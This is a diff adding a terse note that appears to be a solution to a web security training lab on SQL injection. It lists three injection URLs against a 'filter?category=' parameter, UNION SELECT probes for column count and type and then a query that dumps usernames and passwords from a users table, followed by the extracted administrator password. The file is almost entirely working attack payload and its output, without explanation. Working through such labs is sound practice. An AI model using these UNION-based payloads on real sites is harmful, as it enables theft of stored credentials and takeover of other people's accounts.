@@ -1,0 +1,8 @@
+https://aca11fed1fa5e91b807fb221003f00e1.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,NULL--
+
+https://aca11fed1fa5e91b807fb221003f00e1.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,'a'--
+
+https://aca11fed1fa5e91b807fb221003f00e1.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,username || '~' || password FROM users--
+
+Username: administrator
+Password: cj2t02k9h3y7f9mk9h9h
